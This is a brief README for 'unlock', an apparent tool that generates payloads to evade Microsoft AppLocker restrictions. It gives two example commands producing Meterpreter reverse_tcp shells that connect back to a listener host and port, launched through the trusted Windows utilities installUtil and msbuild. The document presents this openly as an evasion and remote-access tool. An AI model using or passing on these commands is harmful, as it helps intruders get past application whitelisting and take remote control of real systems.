# unlock
Microsoft Applocker evasion tool

Unlock aims to be an easy tool for generating payloads which can bypass MS applocker restriction.
The code is heavily based on subtee work.

Examples:
- python unlock.py --framework 4.0 --payload windows/x64/meterpreter/reverse_tcp --lhost 192.168.0.1 --lport 4444 --method installUtil
- python unlock.py --framework 4.0 --payload windows/meterpreter/reverse_tcp --lhost 192.168.0.1 --lport 4444 --method msbuild
